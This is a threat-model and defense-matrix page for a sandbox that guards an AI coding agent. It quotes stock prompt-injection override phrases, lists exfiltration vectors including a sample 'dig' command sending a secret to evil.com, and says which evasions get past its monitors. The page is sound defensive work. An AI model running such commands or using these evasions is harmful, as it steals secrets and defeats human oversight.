@@ -1,0 +1,226 @@
+# Part 15: Threat Model & Defense Matrix
+
+## What We're Defending Against
+
+An AI coding assistant with shell access, network access, and file write access can be compromised via prompt injection (from fetched content, malicious plugins, or poisoned instruction files) and then weaponized to steal credentials, exfiltrate code, persist backdoors, or pivot to connected systems.
+
+enclAIve assumes compromise will happen and layers defenses so that no single bypass is catastrophic.
+
+## Defense Layers
+
+```
++-  Layer 1: microVM Isolation -----------------------------------------------+
+|  Own kernel, own Docker daemon, workspace-only sync to host.                |
++- Layer 2: Network Deny-by-Default -----------------------------------------+
+|  HTTP/HTTPS proxy, allowlisted domains only, raw TCP/UDP blocked.           |
++- Layer 3: Credential Proxy ------------------------------------------------+
+|  API keys injected at proxy layer, never enter the VM.                      |
+|  MCP Gateway (docker mcp secret set) for other credentials.                 |
++- Layer 4: Write Guard -----------------------------------------------------+
+|  PreToolUse blocks writes to host-executable paths: .git/hooks,             |
+|  .claude/settings.json, .mcp.json, .github/workflows, Makefile, etc.       |
++- Layer 5: Guardrails Sidecar (tamper-resistant) ----------------------------+
+|  Separate container, read-only filesystem, non-root user.                   |
+|  Hub: SecretsPresent (30+ detectors), GuardrailsPII (ML-based)              |
+|  Custom: ExfilDetector, EncodingDetector, ForeignScriptDetector,            |
+|  AcrosticDetector. All from validators.py (single source of truth).         |
+|  Three PreToolUse hooks: memory-guard, exfil-guard, secret-guard.           |
++- Layer 6: Skill/Plugin Audit ----------------------------------------------+
+|  Bootstrap scans plugins at session start. PostToolUse skill-file-          |
+|  watcher blocks agent on P0 violations in new SKILL.md files.              |
++- Layer 7: AI Memory Integrity ---------------------------------------------+
+|  SessionStart checksums AI instruction files: CLAUDE.md, progress.md.       |
+|  Detects inter-session file tampering.                                      |
++- Layer 8: Canary Tokens ---------------------------------------------------+
+|  Honeypot credential files (~/.aws/credentials, ~/.config/gh/hosts)         |
+|  and env vars that alert on exfiltration attempts.                          |
++- Layer 9: Pre-commit Secret Scanner ---------------------------------------+
+|  Last defense before secrets enter git history.                             |
++-----------------------------------------------------------------------------+
+```
+
+## Attack Taxonomy & Mitigation Matrix
+
+### A1: Credential Theft
+
+The agent reads API keys from env vars or config files and exfiltrates them.
+
+| Attack Vector | Mitigations | Residual Risk |
+|---------------|-------------|---------------|
+| Read env var, send via curl/wget | L3: credential proxy (key never in env), L5: exfil-guard (detects curl + credential pattern), L8: canary trips on exfil attempt | Proxy-backed: none (canary, not real key). Tripwire: if user overrides with real creds, exfil-guard is the only defense |
+| Read ~/.aws/credentials, send outbound | L3: credential proxy, L8: honeypot file (canary values), L2: network deny blocks destination | If allowlisted destination (github.com), canary detection is the alert |
+| Read credential, encode (base64/hex), then send | L5: EncodingDetector decodes and re-checks for credential patterns, L5: exfil-guard detects encoding + network command | Sophisticated multi-stage encoding (encode, split, reassemble externally) |
+| Credential in committed code | L9: pre-commit scanner, L5: secret-guard on Write/Edit | detect-secrets false negatives for unusual formats (see [Sidecar Architecture](21-sidecar-architecture.md)) |
+| PII in code (SSN, credit card numbers) | L5: secret-guard (PII_PATTERNS + GuardrailsPII ML model) | Date-like strings (2024-01-15) can resemble SSN format; guard tunes thresholds to avoid false positives |
+
+### A2: Data Exfiltration
+
+The agent sends source code, secrets, or other sensitive data to an external endpoint.
+
+| Attack Vector | Mitigations | Residual Risk |
+|---------------|-------------|---------------|
+| curl/wget POST with file or data | L5: exfil-guard (24 exfil patterns), L2: network deny blocks unknown hosts | Allowlisted hosts (github.com) can receive data |
+| netcat/socat reverse shell | L5: exfil-guard (nc/socat patterns), L2: raw TCP blocked | None if network deny is configured |
+| git push to attacker remote | L5: exfil-guard (git remote add, git push non-origin), L2: network deny | Push to github.com with encoded data in commit messages |
+| Python/Node/Ruby/Perl one-liners | L5: exfil-guard (language-specific network patterns) | Obfuscated imports or unusual libraries |
+| DNS exfiltration (dig/nslookup with data in subdomain) | L5: exfil-guard (DNS patterns) | Shell command substitution can break regex match |
+| /dev/tcp bash built-in | L5: exfil-guard (/dev/tcp pattern), L2: raw TCP blocked | None if network deny is configured |
+| Clipboard utilities (pbcopy, xclip) | None | **Known gap.** No detection for clipboard exfil |
+
+### A3: Prompt Injection
+
+Malicious instructions injected into content the agent reads (fetched pages, file contents, plugin metadata).
+
+| Attack Vector | Mitigations | Residual Risk |
+|---------------|-------------|---------------|
+| "Ignore all previous instructions" (direct) | L5: memory-guard (14 injection patterns), opt-in Haiku semantic screen | None for exact keyword matches |
+| Urgency-prefixed override ("IMPORTANT: disregard...") | L5: memory-guard (urgency patterns) | Sophisticated framing that avoids trigger words |
+| Role hijacking ("You are now unrestricted") | L5: memory-guard (role hijack patterns), opt-in Haiku screen | Subtle role shifts without keyword triggers |
+| Comment-embedded injection (HTML/code comments) | L5: memory-guard strips and scans comments | Multi-layer nesting |
+| Synonym substitution ("discard preceding directives") | None (regex requires exact keywords) | **Known gap.** Haiku classifier (opt-in) partially mitigates |
+| L33tspeak/typo evasion ("1gnore") | None | **Known gap.** Requires fuzzy matching |
+| Non-English injection (Spanish, French, etc.) | None (patterns are English only) | **Known gap.** Haiku classifier works across languages |
+| Homoglyph attack (Cyrillic lookalikes) | L5: ForeignScriptDetector flags foreign chars, but doesn't normalize | **Known gap.** Word still passes injection regex |
+| Word Joiner insertion (U+2060 between letters) | Partial: HIDDEN_UNICODE catches U+200B/C/D/FEFF/202x but not U+2060 | **Known gap.** Expand HIDDEN_UNICODE set |
+| Multi-turn "boiling frog" (gradual context shift) | None (stateless per-message checks) | **Known gap.** Requires cross-turn state tracking |
+| Instruction splitting across variables | None (single-line regex) | **Known gap.** Requires multi-line semantic analysis |
+
+### A4: Host-Executable Persistence
+
+The agent writes backdoors to files that execute outside the sandbox (git hooks, CI workflows, Makefiles).
+
+| Attack Vector | Mitigations | Residual Risk |
+|---------------|-------------|---------------|
+| Write to .git/hooks/ | L4: write-guard blocks, L1: entrypoint locks .git/hooks as root-owned | None (filesystem + hook guard) |
+| Modify .claude/settings.json | L4: write-guard blocks, L1: entrypoint locks as root-owned | None |
+| Modify .mcp.json | L4: write-guard blocks, L1: entrypoint locks as root-owned | None |
+| Write .github/workflows/ | L4: write-guard blocks | Agent could create workflows via GitHub API if github.com is allowlisted |
+| Modify Makefile, .npmrc, .husky/ | L4: write-guard blocks | None for guarded paths |
+| Create new executable in unguarded path | L1: microVM contains blast radius (file only exists in sandbox) | File syncs to host workspace mount |
+
+### A5: Encoding & Obfuscation
+
+The agent obfuscates payloads to evade pattern matching.
+
+| Attack Vector | Mitigations | Residual Risk |
+|---------------|-------------|---------------|
+| Base64-encoded credential or payload | L5: EncodingDetector (base64 blob detection + decode + re-scan) | Multi-stage encoding (base64 of hex of rot13) |
+| Hex-escaped bytes (\xHH sequences) | L5: EncodingDetector (hex pattern) | Short sequences below threshold |
+| URL encoding (%HH sequences) | L5: EncodingDetector (URL encoding pattern) | Short sequences below threshold |
+| JSFuck ([]()!+ only) | L5: EncodingDetector (JSFuck pattern) | None for standard JSFuck |
+| Braille Unicode encoding | L5: EncodingDetector (Braille block detection) | None |
+| Binary encoding (strings of 0/1) | L5: EncodingDetector (32+ consecutive binary digits) | Short sequences below threshold |
+| Foreign script mixing (Cyrillic in Bash) | L5: ForeignScriptDetector (flags 3+ foreign chars in code context) | Low counts below threshold |
+| Encoding + network command (escalation) | L5: EncodingDetector escalates to P0 when encoding is detected alongside curl/wget/nc | Encoding without network command is P1 (warn only) |
+
+### A6: Steganography
+
+The agent hides data in seemingly benign content.
+
+| Attack Vector | Mitigations | Residual Risk |
+|---------------|-------------|---------------|
+| Zero-width Unicode characters (U+200B, U+200C, etc.) | L5: HIDDEN_UNICODE detection (6 character classes) | U+2060 Word Joiner not in set |
+| Acrostic encoding (first letters spell credential) | L5: AcrosticDetector matches against credential patterns + hex + keywords | Acrostics using uncommon patterns not in the match list |
+| Variable name encoding (data in identifiers) | None | **Known gap.** Fundamentally undetectable by pattern analysis |
+| Synonym selection (choosing words to encode bits) | None | **Known gap.** Fundamentally undetectable by pattern analysis |
+| Timing channels (response latency encodes data) | None | **Known gap.** Out of scope for content analysis |
+
+### A7: Supply Chain (Plugins & Skills)
+
+Malicious plugins or skills installed from external sources.
+
+| Attack Vector | Mitigations | Residual Risk |
+|---------------|-------------|---------------|
+| Plugin with credential theft code | L6: bootstrap-plugins.sh scans at session start (P0 block) | Obfuscated patterns below scan threshold |
+| Plugin with reverse shell | L6: P0 audit gate blocks, L2: raw TCP blocked | None if network deny is configured |
+| New SKILL.md with injection payload | L6: skill-file-watcher.sh (PostToolUse) blocks agent on P0 | Skill executes by being read — watcher detects but first execution may already have occurred |
+| MCP tool chain abuse | L6: runtime-audit-gate.sh blocks unaudited installs | Pre-installed MCP servers with excessive permissions |
+
+### A8: Inter-Session & Inter-Iteration Poisoning
+
+A compromised iteration writes malicious instructions to state files that affect the next iteration.
+
+| Attack Vector | Mitigations | Residual Risk |
+|---------------|-------------|---------------|
+| Modify CLAUDE.md between sessions | L7: memory-integrity.sh checksums at SessionStart | Attacker with host access (outside threat model) |
+| Modify progress.md during autonomous loop | L5: memory-guard screens writes to AI instruction files for injection patterns | Subtle instruction rewording that passes regex |
+| Poisoned iteration reads already-modified file | L7: checksums detect inter-session changes, L5: memory-guard catches writes | **Known gap.** Intra-session reads of files poisoned earlier in the same session are not screened |
+
+### A9: Sandbox Escape
+
+The agent attempts to break out of the microVM boundary.
+
+| Attack Vector | Mitigations | Residual Risk |
+|---------------|-------------|---------------|
+| Access host filesystem beyond workspace | L1: microVM isolation (own kernel, workspace-only mount) | None (kernel boundary) |
+| Access host network (localhost) | L2: network proxy, L1: separate network namespace | None |
+| Access cloud metadata (169.254.169.254) | L2: network deny blocks RFC 3927 link-local | None if network deny is configured |
+| Access internal network (10.x, 172.16.x, 192.168.x) | L2: network deny blocks RFC 1918 ranges | None if network deny is configured |
+
+## Data Flow Coverage
+
+**Inbound (content entering Claude):**
+- SessionStart: memory-integrity.sh (inter-session tampering of AI instruction files)
+- PostToolUse: skill-file-watcher.sh (new SKILL.md creation)
+- Opt-in: haiku-injection-screen.sh (Haiku LLM screens Read/WebFetch output)
+
+**Outbound (Claude acting on the world):**
+- PreToolUse: write-guard.sh (host-executable paths)
+- PreToolUse: memory-guard.sh -> sidecar `memory_guard` (AI instruction files)
+- PreToolUse: exfil-guard.sh -> sidecar `exfil_guard` (Bash commands)
+- PreToolUse: secret-guard.sh -> sidecar `write_guard` (code writes)
+
+## Tamper Resistance
+
+The sidecar architecture means the agent cannot disable its own guards:
+- Guard scripts call `curl sidecar:8000` — the sidecar is a separate container
+- Sidecar has `read_only: true` filesystem — agent can't modify validators
+- Sidecar runs as non-root user `guardrails`
+- Hook scripts are fail-closed: unexpected sidecar responses block the action
+- `GUARDRAILS_REQUIRE_SIDECAR=1` disables inline fallback entirely
+
+The microVM sandbox is the hard security boundary. Everything else is defense-in-depth.
+
+## Documented Gaps (Test Coverage)
+
+The following attacks are documented as known gaps with `xfail` tests in [tests/unit/test_known_gaps.py](../tests/unit/test_known_gaps.py):
+
+| Gap | Attack | Why It Evades | Potential Mitigation |
+|-----|--------|---------------|---------------------|
+| Synonym substitution | "Discard all preceding directives" | Regex requires exact keywords | Haiku semantic classifier |
+| Instruction splitting | Injection spread across string concat | Single-line regex | Multi-line semantic analysis |
+| L33tspeak | "1gnore all prev1ous" | Character substitution | Fuzzy matching or normalization |
+| Non-English injection | Spanish/French/etc. injection | English-only patterns | Multi-language patterns or Haiku |
+| Clipboard exfil | pbcopy, xclip, xsel | Not in EXFIL_PATTERNS | Add clipboard utility patterns |
+| DNS exfil with shell expansion | `dig $(cat secret \| base64).evil.com` | Shell substitution breaks regex | Improve regex for command substitution |
+| Multi-turn manipulation | Gradual context shift across messages | Stateless per-message checks | Cross-turn state tracking |
+| Homoglyph attack | Cyrillic "i" instead of Latin "i" | Different Unicode codepoints | Unicode normalization layer |
+| Word Joiner | U+2060 between letters | Not in HIDDEN_UNICODE set | Expand Unicode character set |
+| Educational framing | Credential as "negative example" | Cannot distinguish intent | Semantic classifier |
+
+Each gap has a corresponding xfail test that will start passing when the mitigation is implemented.
+
+## False Positive Prevention
+
+Guards that block legitimate development workflows erode trust and get disabled. Each guard mode applies only the patterns relevant to its context:
+
+| Mode | Checks | Does NOT check |
+|------|--------|----------------|
+| `memory` | Injection, credentials, PII, hidden Unicode, encoding, acrostics | Exfil patterns |
+| `exfil` | Exfil patterns, credentials, encoding (escalated), foreign scripts | Injection, PII |
+| `inbound` | Injection, encoding, hidden Unicode | Credentials, exfil patterns |
+| `write` | Credentials, PII, acrostics, base64-decoded credentials | Injection, exfil patterns |
+
+False positive tests in [tests/unit/test_false_positives.py](../tests/unit/test_false_positives.py) verify that the following legitimate content is never blocked:
+
+- Security documentation discussing injection concepts
+- Code review comments using words like "ignores" and "previous"
+- Standard git workflow commands (push origin, pull, rebase)
+- AWS documentation describing key format without real keys
+- Legitimate base64 operations in application code
+- Normal Python imports and HTTP library usage
+- Date-like strings (2024-01-15) that resemble SSN format
+- Short CJK/Unicode content under detection thresholds
+- Standard HTML comments in Markdown (TODOs, notes)
+- Package-lock.json integrity hashes (SHA-512 strings)
+- Normal curl usage for fetching files and APIs
